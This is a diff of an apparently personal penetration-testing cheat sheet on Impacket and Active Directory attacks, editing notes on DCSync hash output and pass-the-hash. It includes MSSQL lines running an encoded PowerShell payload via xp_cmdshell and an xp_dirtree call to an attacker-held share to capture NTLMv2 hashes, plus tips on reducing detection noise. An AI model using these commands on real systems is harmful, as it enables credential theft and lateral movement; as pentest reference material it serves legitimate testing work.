@@ -5,6 +5,7 @@ weight: 20
 draft: false
 tags: ["impacket", "active-directory", "kerberos", "lateral-movement"]
 summary: "Reference for the Impacket tools and options I use repeatedly in real penetration tests."
+description: "Reference for the Impacket tools and options I use repeatedly in real penetration tests."
 ---
 
 Impacket is a collection of Python tools for working with network protocols. For AD pentesting in practice, I use six of them constantly. This is the reference for those six — what each does, when to use it, and the exact commands I run.
@@ -150,7 +151,7 @@ When you've already grabbed the NTDS.dit and SYSTEM hive files (via VSS snapshot
 
 - **Remote DCSync is loud.** It generates specific Windows events (4662 with replication GUIDs). On a real engagement, a SOC analyst (like me, in the past) would flag it. Use `-just-dc-ntlm` or `-just-dc-user` to minimize noise.
 
-- Hash output format is `LM:NTLM`. For pass-the-hash you only need the NTLM part after the second colon.
+- Hash output format is `LM:NTLM`; full dumps are `user:rid:LM:NTLM`. For pass-the-hash you need the NTLM value after the last colon, used as `-hashes :NTLM_HASH`.
 
 - Local parsing needs **both** NTDS.dit and SYSTEM. SYSTEM has the boot key that decrypts the hashes.
 
@@ -240,7 +241,7 @@ xp_cmdshell 'whoami'
 xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'
 
 -- NTLMv2 hash capture (works without sysadmin)
-xp_dirtree '\\YOUR_IP\share'
+xp_dirtree '\\$ip\share'
 ```
 
 ### Key flags
